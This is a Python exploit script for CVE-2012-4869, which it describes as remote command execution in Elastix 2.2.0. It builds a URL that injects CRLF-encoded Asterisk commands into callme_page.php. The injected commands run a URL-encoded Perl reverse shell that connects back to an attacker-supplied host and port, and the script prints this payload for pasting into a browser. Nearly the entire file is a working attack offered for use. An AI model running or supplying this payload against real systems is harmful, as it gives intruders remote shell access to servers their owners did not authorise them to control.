import sys, pycurl

if len(sys.argv) != 4:
    print("* CVE-2012-4869 | Elastix 2.2.0 - Remote Command Execution *\n")
    print("Usage: python3 <rhost> <lhost> <lport>")
    print("Example: python3 https://133.130.21.2 127.0.0.1 1337")
    sys.exit()

rhost = sys.argv[1]
lhost = sys.argv[2]
lport = sys.argv[3]
callmenum = "233"

url = f'{rhost}/recordings/misc/callme_page.php?action=c&callmenum={callmenum}@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22{lhost}%3a{lport}%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'

print("[ + ] Here is your payload, enter it in your browser and ignore warnings.")
print(70 * '-')
print(url)
print(70 * '-')


